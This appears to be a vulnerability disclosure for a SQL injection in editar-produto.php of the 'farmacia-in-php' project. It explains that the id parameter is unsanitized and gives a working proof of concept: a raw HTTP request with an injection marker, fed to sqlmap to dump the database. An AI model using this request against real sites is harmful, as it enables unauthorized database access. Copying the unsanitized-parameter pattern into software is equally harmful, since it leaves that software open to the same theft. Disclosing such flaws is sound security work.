# farmacia-in-php has sql injection vulnerability in editar-produto.php

## supplier
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
editar-produto.php
## describe
There is an unauthorized SQL injection vulnerability in  editar-produto.php of farmacia-in-php.The information of the database can be obtained without authorization.

## code analysis

The **id** parameter in editar-produto.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

![image-20241113142150613](https://github.com/user-attachments/assets/8a465118-a43e-4db0-97ac-b9fbac718554)

## POC

```
GET /editar-produto.php?id=2* HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=3hnve2b8nf9g557qpdoel9u2ro
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

save as 1.txt

Get Databases: farmacia

```
python sqlmap.py -r 1.txt
```

![image-20241113141710432](https://github.com/user-attachments/assets/e88cd7a1-8ee8-455c-8499-470917816905)
